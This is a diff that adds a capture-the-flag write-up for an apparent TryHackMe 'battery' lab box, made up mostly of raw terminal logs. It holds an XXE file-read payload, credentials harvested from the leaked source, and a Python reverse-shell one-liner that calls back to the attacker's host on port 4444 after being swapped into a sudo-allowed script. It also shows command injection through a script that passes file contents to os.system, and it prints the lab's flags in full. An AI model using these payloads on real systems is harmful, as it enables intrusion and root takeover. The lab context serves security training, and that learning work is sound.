@@ -350,3 +350,355 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
+http://10.10.180.32/index.html           (Status: 200) [Size: 406]
+http://10.10.180.32/register.php         (Status: 200) [Size: 715]
+http://10.10.180.32/.html                (Status: 403) [Size: 284]
+http://10.10.180.32/.php                 (Status: 403) [Size: 283]
+http://10.10.180.32/admin.php            (Status: 200) [Size: 663]
+http://10.10.180.32/scripts              (Status: 301) [Size: 313] [--> http://10.10.180.32/scripts/]
+http://10.10.180.32/forms.php            (Status: 200) [Size: 2334]
+http://10.10.180.32/report               (Status: 200) [Size: 16912]
+http://10.10.180.32/logout.php           (Status: 302) [Size: 0] [--> admin.php]
+http://10.10.180.32/dashboard.php        (Status: 302) [Size: 908] [--> admin.php]
+http://10.10.180.32/acc.php              (Status: 200) [Size: 1104]
+http://10.10.180.32/with.php             (Status: 302) [Size: 1259] [--> admin.php]
+http://10.10.180.32/tra.php              (Status: 302) [Size: 1399] [--> admin.php]
+http://10.10.180.32/.php                 (Status: 403) [Size: 283]
+http://10.10.180.32/.html                (Status: 403) [Size: 284]
+http://10.10.180.32/server-status        (Status: 403) [Size: 292]
+
+<!--?xml version="1.0" ?-->
+
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/acc.php"> ]>
+
+<root>
+
+<name>
+
+test
+
+</name>
+
+<search>
+
+&example;
+
+</search>
+
+</root>
+
+Sorry, account number 
+PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHN0eWxlPgpmb3JtCnsKICBib3JkZXI6IDJweCBzb2xpZCBibGFjazsKICBvdXRsaW5lOiAjNENBRjUwIHNvbGlkIDNweDsKICBtYXJnaW46IGF1dG87CiAgd2lkdGg6MTgwcHg7CiAgcGFkZGluZzogMjBweDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7Cn0KCgp1bCB7CiAgbGlzdC1zdHlsZS10eXBlOiBub25lOwogIG1hcmdpbjogMDsKICBwYWRkaW5nOiAwOwogIG92ZXJmbG93OiBoaWRkZW47CiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMzsKfQoKbGkgewogIGZsb2F0OiBsZWZ0OwogIGJvcmRlci1yaWdodDoxcHggc29saWQgI2JiYjsKfQoKbGk6bGFzdC1jaGlsZCB7CiAgYm9yZGVyLXJpZ2h0OiBub25lOwp9CgpsaSBhIHsKICBkaXNwbGF5OiBibG9jazsKICBjb2xvcjogd2hpdGU7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIHBhZGRpbmc6IDE0cHggMTZweDsKICB0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KCmxpIGE6aG92ZXI6bm90KC5hY3RpdmUpIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTExOwp9CgouYWN0aXZlIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiBibHVlOwp9Cjwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+Cgo8dWw+CiAgPGxpPjxhIGhyZWY9ImRhc2hib2FyZC5waHAiPkRhc2hib2FyZDwvYT48L2xpPgogIDxsaT48YSBocmVmPSJ3aXRoLnBocCI+V2l0aGRyYXcgTW9uZXk8L2E+PC9saT4KICA8bGk+PGEgaHJlZj0iZGVwby5waHAiPkRlcG9zaXQgTW9uZXk8L2E+PC9saT4KICA8bGk+PGEgaHJlZj0idHJhLnBocCI+VHJhbnNmZXIgTW9uZXk8L2E+PC9saT4KICA8bGk+PGEgaHJlZj0iYWNjLnBocCI+TXkgQWNjb3VudDwvYT48L2xpPgogIDxsaT48YSBocmVmPSJmb3Jtcy5waHAiPmNvbW1hbmQ8L2E+PC9saT4KICA8bGk+PGEgaHJlZj0ibG9nb3V0LnBocCI+TG9nb3V0PC9hPjwvbGk+CiAgPGxpIHN0eWxlPSJmbG9hdDpyaWdodCI+PGEgaHJlZj0iY29udGFjdC5waHAiPkNvbnRhY3QgVXM8L2E+PC9saT4KPC91bD48YnI+PGJyPjxicj48YnI+Cgo8L2JvZHk+CjwvaHRtbD4KCjw/cGhwCgpzZXNzaW9uX3N0YXJ0KCk7CmlmKGlzc2V0KCRfU0VTU0lPTlsnZmF2Y29sb3InXSkgYW5kICRfU0VTU0lPTlsnZmF2Y29sb3InXT09PSJhZG1pbkBiYW5rLmEiKQp7CgplY2hvICI8aDMgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+V2VjbG9tZSB0byBBY2NvdW50IGNvbnRyb2wgcGFuZWw8L2gzPiI7CmVjaG8gIjxmb3JtIG1ldGhvZD0nUE9TVCc+IjsKZWNobyAiPGlucHV0IHR5cGU9J3RleHQnIHBsYWNlaG9sZGVyPSdBY2NvdW50IG51bWJlcicgbmFtZT0nYWNubyc+IjsKZWNobyAiPGJyPjxicj48YnI+IjsKZWNobyAiPGlucHV0IHR5cGU9J3RleHQnIHBsYWNlaG9sZGVyPSdNZXNzYWdlJyBuYW1lPSdtc2cnPiI7CmVjaG8gIjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdTZW5kJyBuYW1lPSdidG4nPiI7CmVjaG8gIjwvZm9ybT4iOwovL01ZIENSRURTIDotIGN5YmVyOnN1cGVyI3NlY3VyZSZwYXNzd29yZCEKaWYoaXNzZXQoJF9QT1NUWydidG4nXSkpCnsKJG1zPSRfUE9TVFsnbXNnJ107CmVjaG8gIm1zOiIuJG1zOwppZigkbXM9PT0iaWQiKQp7CnN5c3RlbSgkbXMpOwp9CmVsc2UgaWYoJG1zPT09Indob2FtaSIpCnsKc3lzdGVtKCRtcyk7Cn0KZWxzZQp7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ1JDRSBEZXRlY3RlZCEnKTwvc2NyaXB0PiI7CnNlc3Npb25fZGVzdHJveSgpOwp1bnNldCgkX1NFU1NJT05bJ2ZhdmNvbG9yJ10pOwpoZWFkZXIoIlJlZnJlc2g6IDAuMTsgdXJsPWluZGV4Lmh0bWwiKTsKfQp9Cn0KZWxzZQp7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ09ubHkgQWRtaW5zIGNhbiBhY2Nlc3MgdGhpcyBwYWdlIScpPC9zY3JpcHQ+IjsKc2Vzc2lvbl9kZXN0cm95KCk7CnVuc2V0KCRfU0VTU0lPTlsnZmF2Y29sb3InXSk7CmhlYWRlcigiUmVmcmVzaDogMC4xOyB1cmw9aW5kZXguaHRtbCIpOwp9Cj8+Cg==
+ is not active!
+
+2V0KCRfU0VTU0lPTlsnZmF2Y29sb3InXSk7CmhlYWRlcigiUmVmcmVzaDogMC4xOyB1cmw9aW5kZXguaHRtbCIpOwp9Cj8+Cg==" | base64 -d
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+form
+{
+  border: 2px solid black;
+  outline: #4CAF50 solid 3px;
+  margin: auto;
+  width:180px;
+  padding: 20px;
+  text-align: center;
+}
+
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #333;
+}
+
+li {
+  float: left;
+  border-right:1px solid #bbb;
+}
+
+li:last-child {
+  border-right: none;
+}
+
+li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover:not(.active) {
+  background-color: #111;
+}
+
+.active {
+  background-color: blue;
+}
+</style>
+</head>
+<body>
+
+<ul>
+  <li><a href="dashboard.php">Dashboard</a></li>
+  <li><a href="with.php">Withdraw Money</a></li>
+  <li><a href="depo.php">Deposit Money</a></li>
+  <li><a href="tra.php">Transfer Money</a></li>
+  <li><a href="acc.php">My Account</a></li>
+  <li><a href="forms.php">command</a></li>
+  <li><a href="logout.php">Logout</a></li>
+  <li style="float:right"><a href="contact.php">Contact Us</a></li>
+</ul><br><br><br><br>
+
+</body>
+</html>
+
+<?php
+
+session_start();
+if(isset($_SESSION['favcolor']) and $_SESSION['favcolor']==="admin@bank.a")
+{
+
+echo "<h3 style='text-align:center;'>Weclome to Account control panel</h3>";
+echo "<form method='POST'>";
+echo "<input type='text' placeholder='Account number' name='acno'>";
+echo "<br><br><br>";
+echo "<input type='text' placeholder='Message' name='msg'>";
+echo "<input type='submit' value='Send' name='btn'>";
+echo "</form>";
+//MY CREDS :- cyber:super#secure&password!
+if(isset($_POST['btn']))
+{
+$ms=$_POST['msg'];
+echo "ms:".$ms;
+if($ms==="id")
+{
+system($ms);
+}
+else if($ms==="whoami")
+{
+system($ms);
+}
+else
+{
+echo "<script>alert('RCE Detected!')</script>";
+session_destroy();
+unset($_SESSION['favcolor']);
+header("Refresh: 0.1; url=index.html");
+}
+}
+}
+else
+{
+echo "<script>alert('Only Admins can access this page!')</script>";
+session_destroy();
+unset($_SESSION['favcolor']);
+header("Refresh: 0.1; url=index.html");
+}
+?>
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh cyber@10.10.180.32                        
+The authenticity of host '10.10.180.32 (10.10.180.32)' can't be established.
+ED25519 key fingerprint is SHA256:bTNXpvfykuLebPN3kSFZTMvEtACHZnk64YKhtu6tMKI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.180.32' (ED25519) to the list of known hosts.
+cyber@10.10.180.32's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Wed Jul  5 06:29:21 IST 2023
+
+  System load:  3.04              Processes:           98
+  Usage of /:   2.4% of 68.28GB   Users logged in:     0
+  Memory usage: 12%               IP address for eth0: 10.10.180.32
+  Swap usage:   0%
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+Last login: Tue Nov 17 17:02:47 2020 from 192.168.29.248
+cyber@ubuntu:~$ id
+uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)
+
+cyber@ubuntu:~$ cat flag1.txt 
+THM{6f7e4dd134e19af144c88e4fe46c67ea}
+
+Sorry I am not good in designing ascii art :(
+
+cyber@ubuntu:~$ sudo -l
+Matching Defaults entries for cyber on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cyber may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
+cyber@ubuntu:~$ ls
+flag1.txt  run.py
+cyber@ubuntu:~$ cat run.py 
+cat: run.py: Permission denied
+cyber@ubuntu:~$ rm run.py 
+rm: remove write-protected regular file ‘run.py’? yes
+cyber@ubuntu:~$ ls
+flag1.txt
+cyber@ubuntu:~$ nano run.py
+cyber@ubuntu:~$ cat run.py 
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+
+cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvp 4444                                      
+listening on [any] 4444 ...
+10.10.180.32: inverse host lookup failed: Unknown host
+connect to [10.8.19.103] from (UNKNOWN) [10.10.180.32] 53690
+root@ubuntu:~# cd /root       cd /root
+cd /root
+root@ubuntu:/root# ls                 ls
+ls
+root.txt
+root@ubuntu:/root# cat root.txt       cat root.txt
+cat root.txt
+████████████████████████████████████  
+██                                ██  
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██  ████  ████  ████  ████  ████  ████
+██                                ██  
+████████████████████████████████████  
+
+						battery designed by cyberbot :)
+						Please give your reviews on catch_me75@protonmail.com or discord cyberbot#1859
+
+THM{db12b4451d5e70e2a177880ecfe3428d}
+
+root@ubuntu:/home/yash# ls                      ls
+ls
+emergency.py  fernet  flag2.txt  root.txt
+root@ubuntu:/home/yash# cat flag2.txt           cat flag2.txt
+cat flag2.txt
+THM{20c1d18791a246001f5df7867d4e6bf5}
+
+Sorry no ASCII art again :(
+root@ubuntu:/home/yash# cat root.txt            cat root.txt
+cat root.txt
+Note from root :-
+	Hey Yash, 
+			I Hope you are doing good , I just wanted to let you know that I am going on leave for 2 days ,
+			till then I have setup the permission to run some commands as user root , But Sorry , I forgot 
+			your password , try to find it!!
+
+										-ENCRYPTI0N_15_U53D
+
+root@ubuntu:/home/yash# cat fernet              cat fernet
+cat fernet
+encrypted_text:gAAAAABfs33Qms9CotZIEBMg76eOlwOiKU8LD_mX2F346WXXBVIlXWvWGfreAX4kU5hjGXf0PiwtP0cmOm5JSUI7zl03V1JKlA==
+
+key:7OEIooZqOpT7vOh9ax8arbBeB8e243Pr8K4IVWBStgA=
+
+https://asecuritysite.com/tokens/ferdecode
+
+Decoded:	idkpassyash
+Date created:	Tue Nov 17 07:37:52 2020
+Current time:	Wed Jul  5 02:12:06 2023
+
+======Analysis====
+Decoded data:  80000000005fb37dd09acf42a2d648101320efa78e9703a2294f0b0ff997d85df8e965d70552255d6bd619fade017e245398631977f43e2c2d3f47263a6e4949423bce5d3757524a94
+Version:	80
+Date created:	000000005fb37dd0
+IV:		9acf42a2d648101320efa78e9703a229
+Cipher:		4f0b0ff997d85df8e965d70552255d6b
+HMAC:		d619fade017e245398631977f43e2c2d3f47263a6e4949423bce5d3757524a94
+
+======Converted====
+IV:		9acf42a2d648101320efa78e9703a229
+Time stamp:	1605598672
+Date created:	Tue Nov 17 07:37:52 2020
+
+cyber@ubuntu:/home$ su yash
+Password: 
+yash@ubuntu:/home$ ls
+cyber  yash
+yash@ubuntu:/home$ cd yash/
+yash@ubuntu:~$ ls
+emergency.py  fernet  flag2.txt  root.txt
+yash@ubuntu:~$ cat emergency.py 
+cat: emergency.py: Permission denied
+
+yash@ubuntu:~$ sudo -l
+[sudo] password for yash: 
+Matching Defaults entries for yash on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User yash may run the following commands on ubuntu:
+    (root) PASSWD: /usr/bin/python3 /home/yash/emergency.py
+
+01110010 01100101 01100001 01100100 01101001 01101110 01100111 00100000 00101111 01101111 01110000 01110100 00101111 01100010 01101001 01101110 01110011 01101001 01100100 01100101 00100000 01100110 01101001 01101100 01100101
+
+reading /opt/binside file
+
+yash@ubuntu:~$ echo /bin/bash > /opt/binside
+yash@ubuntu:~$ sudo /usr/bin/python3 /home/yash/emergency.py
+01110010 01100101 01100001 01100100 01101001 01101110 01100111 00100000 00101111 01101111 01110000 01110100 00101111 01100010 01101001 01101110 01110011 01101001 01100100 01100101 00100000 01100110 01101001 01101100 01100101
+checking if you are a human.....................Test Passed [✔]
+
+/bin/bash to binary
+
+00101111 01100010 01101001 01101110 00101111 01100010 01100001 01110011 01101000
+
+yash@ubuntu:~$ echo 00101111 01100010 01101001 01101110 00101111 01100010 01100001 01110011 01101000  > /opt/binside
+yash@ubuntu:~$ sudo /usr/bin/python3 /home/yash/emergency.py
+01110010 01100101 01100001 01100100 01101001 01101110 01100111 00100000 00101111 01101111 01110000 01110100 00101111 01100010 01101001 01101110 01110011 01101001 01100100 01100101 00100000 01100110 01101001 01101100 01100101
+checking if you are a human...................Test Failed [✘]
+
+root@ubuntu:~# ls
+emergency.py  fernet  flag2.txt  root.txt
+root@ubuntu:~# cat emergency.py 
+import os,time,sys
+
+def delay_print(s):
+	for c in s:
+		sys.stdout.write(c)
+		sys.stdout.flush()
+		time.sleep(0.04)
+
+def BinaryToDecimal(binary): 
+	string = int(binary, 2) 
+	return string 
+
+str_data=""
+print("01110010 01100101 01100001 01100100 01101001 01101110 01100111 00100000 00101111 01101111 01110000 01110100 00101111 01100010 01101001 01101110 01110011 01101001 01100100 01100101 00100000 01100110 01101001 01101100 01100101")
+try:
+	with open('/opt/binside','r') as f:
+		for p in f:
+			for m in p.split():
+				inn=int(m,2)
+				ass=chr(inn)
+				str_data+=ass
+			f=open('/opt/binside','a')
+			delay_print("checking if you are a human...................Test Failed [✘]\n\n")
+			f.write(str(os.system(str_data)))
+			f.write("\n")
+except Exception as e:
+	time.sleep(4)
+	delay_print("checking if you are a human.....................Test Passed [✔]\n\n")
+```
+Base Flag :
+User Flag :
+Root Flag :
+
+## Flags / Answers
+- ***THM{6f7e4dd134e19af144c88e4fe46c67ea}***
+- ***THM{20c1d18791a246001f5df7867d4e6bf5}***
+- ***THM{db12b4451d5e70e2a177880ecfe3428d}***
+
+## Notes / Lessons Learned
+[[Sustah]]
+
